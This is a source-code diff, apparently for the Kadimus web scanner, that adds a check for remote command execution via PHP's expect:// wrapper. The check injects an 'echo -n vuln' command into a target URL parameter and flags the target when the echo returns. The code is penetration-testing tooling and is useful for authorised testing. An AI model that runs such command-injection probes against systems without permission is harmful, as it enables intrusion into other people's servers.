@@ -1,6 +1,5 @@
 #include "scan/rce-scan.h"
-#include "techniques/php-input.h"
-#include "techniques/datawrap.h"
+#include "techniques/rce.h"
 #include "request/request.h"
 #include "regex/pcre.h"
 #include "io/utils.h"
@@ -122,9 +121,24 @@ void auth_log_scan(url_t *url, int pos)
 	xinfo("/var/log/auth.log test finish\n");
 }
 
+void expect_scan(url_t *url, int pos)
+{
+	xinfo("testing expect://cmd rce ...\n");
+
+	char *rce = expect_url(url, "echo -n vuln", pos);
+	if (rce && !strcmp(rce, "vuln")) {
+		xgood("target vulnerable to expect://cmd\n");
+		xgood("parameter: %s\n", url->parameters[pos].key);
+	}
+
+	free(rce);
+	xinfo("expect://cmd test finish\n");
+}
+
 void kadimus_rce_scan(url_t *url, int pos)
 {
 	php_input_scan(url, pos);
 	data_wrap_scan(url, pos);
 	auth_log_scan(url, pos);
+	expect_scan(url, pos);
 }
